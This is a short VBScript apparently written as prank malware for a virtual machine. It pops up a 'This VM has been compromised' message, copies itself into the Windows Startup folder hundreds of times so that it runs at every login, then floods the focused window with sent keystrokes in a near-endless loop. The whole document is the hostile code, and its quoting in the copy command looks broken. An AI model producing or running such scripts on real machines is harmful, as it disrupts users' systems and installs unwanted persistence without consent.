set a = createobject("wscript.shell")

msgbox("This VM has been compromised by IHaveSoManyNamesHere. Enjoy!")


for i=1 to 420

set xc = createobject("wscript.shell")

xc.Run "cmd /c copy "C:\Users\Dartz\Desktop\bash.vbs" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"",0,true

next
msgbox("Round 1 is Over!")


for i=1 to 99999999999999999999999
	a.sendkeys("This VM has been compromised by IHaveSoManyNamesHere. Enjoy! ")
	a.sendkeys("{ENTER}")
	wscript.sleep (30)
next
msgbox("Round 2 is Over!")
